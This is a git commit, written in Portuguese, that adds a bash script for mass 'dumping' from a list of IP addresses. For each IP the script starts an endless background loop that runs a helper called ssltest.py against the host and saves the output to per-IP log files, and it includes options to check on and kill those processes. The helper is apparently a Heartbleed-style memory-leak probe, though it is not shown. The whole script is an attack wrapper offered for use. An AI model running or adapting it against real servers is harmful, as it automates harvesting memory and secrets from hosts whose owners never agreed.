44a74fda046a9d95085e19c449a08c8e0c4f0306
root <root@cloud.hackstore.com.br>
2014-04-12 20:05:40 -0300

    Adicionado script para dump em massa

---
+++ mass_ssltest.sh
@@ -0,0 +1,65 @@
+#!/bin/bash
+# Feito por coffnix
+# https://github.com/isgroup-srl/openmagic.git
+#
+# cd /opt ; git clone ; voila! ;)
+
+
+
+crunch() {
+        while read FOO ; do
+              echo $FOO
+        done
+        }
+
+LISTA_IPS="/opt/openmagic/lista_ips.txt"
+
+
+
+
+for i in $@
+do
+case $i in
+
+--status)
+echo -e "processos executados:\n"
+ps auxw|grep $0|egrep -v 'grep|status'
+exit 1
+
+;;
+
+--all)
+
+if [ ! -e "${LISTA_IPS}" ] ; then
+       echo -e "\n\033[1;31mPor favor, Adicione um arquivo de listas de IPs.\033[m\017\nex: $LISTA_IPS\n"
+       exit;
+fi
+
+{
+while read IP;do
+
+	{
+	while [ 1 ]; do python ssltest.py ${IP} >> dump-${IP}.log 2> /dev/null; done
+	} &
+
+done < ${LISTA_IPS}
+} &
+
+exit 1
+;;
+
+--kill)
+
+ps auxw|grep $0|crunch|cut -d" " -f2| xargs kill -9
+
+exit 1
+;;
+
+*)                                                                                                                                                          
+echo -e "\nOPÇÃO INVÁLIDA: Por favor, escolha entre --all ou --kill ou --status.\n\n"
+
+;;
+
+esac done
+
+echo -e "\nPor favor, escolha entre --all ou --kill ou --status.\n\n"
